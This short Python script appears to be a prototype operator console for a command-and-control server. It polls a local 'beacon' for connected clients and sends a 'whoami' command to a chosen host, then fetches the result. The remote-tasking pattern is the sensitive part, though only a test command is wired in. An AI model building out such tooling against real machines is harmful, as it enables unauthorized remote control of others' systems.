import time, threading, requests, json


alive_hosts = []
beacon = 'http://localhost:8080'
def update_alive_hosts(stop_event):
    global alive_hosts
    while not stop_event.is_set():
        time.sleep(3)
        try:
            response = requests.get(f"{beacon}/clients")
            new_hosts = json.loads(response.text)
            if new_hosts != alive_hosts:
                alive_hosts = new_hosts
        except (requests.exceptions.ConnectionError, json.decoder.JSONDecodeError):
            pass

def print_live_hosts():
    print("Live Hosts:")
    for host in alive_hosts:
        print(f"\t{host}")

def menu():
    print("1. Print live hosts")
    print("2. whoami (test)")

    print("3. Exit")

def main():
    try:
        while True:
            menu()
            choice = input(">> ")
            if choice == '1':
                print_live_hosts()
            elif choice == '2':
                print_live_hosts()
                try:
                    host = input("Enter host: ")
                    requests.post(f"{beacon}/command", data=f"{host} | whoami")
                    time.sleep(3)
                    response = requests.get(f"{beacon}/get_result")
                    print(response.text)
                except requests.exceptions.ConnectionError:
                    print("Host is not responding.")
            elif choice == '3':
                raise KeyboardInterrupt
            else:
                print("Invalid choice.")
    except KeyboardInterrupt:
        print("Exiting...")
        stop_event.set()

if __name__ == '__main__':
    stop_event = threading.Event()
    update_thread = threading.Thread(target=update_alive_hosts, args=(stop_event,))
    update_thread.start()
    main()
    update_thread.join()
